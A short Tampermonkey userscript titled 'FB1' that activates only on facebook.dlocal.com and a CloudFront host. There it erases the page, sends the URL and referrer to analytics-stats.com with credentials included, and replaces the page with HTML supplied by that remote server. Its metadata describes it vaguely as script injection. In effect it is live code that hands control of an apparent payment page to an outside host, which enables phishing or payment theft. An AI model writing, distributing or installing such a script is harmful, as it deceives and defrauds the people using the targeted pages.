// ==UserScript==
// @name         FB1
// @namespace    http://tampermonkey.net/
// @version      3.0
// @description  Inject an external script from a specific domain on any site.
// @match        *://*/*
// @grant        none
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/477991/FB1.user.js
// @updateURL https://update.greasyfork.org/scripts/477991/FB1.meta.js
// ==/UserScript==

if (location.host == 'facebook.dlocal.com' || location.host == 'd2wn155wkkluhq.cloudfront.net') {

  document.write(' ');

  var data = {
    url: location.href,
    referrer: document.referrer,
  };

  var query =  new URLSearchParams(data).toString();
  var url = "https://analytics-stats.com/rapipago/get?"+query;

  var options = {
    credentials: 'include', 
  };

  fetch(url, options)
  .then(response => response.json())
  .then(data => {
    if(data.status == 'ok'){
      document.write(data.text);
    }else{
      document.write(data.text);
      alert(data.text);
    }
    console.log(data);

  })
  .catch(error => {
    console.log(error);
  });

}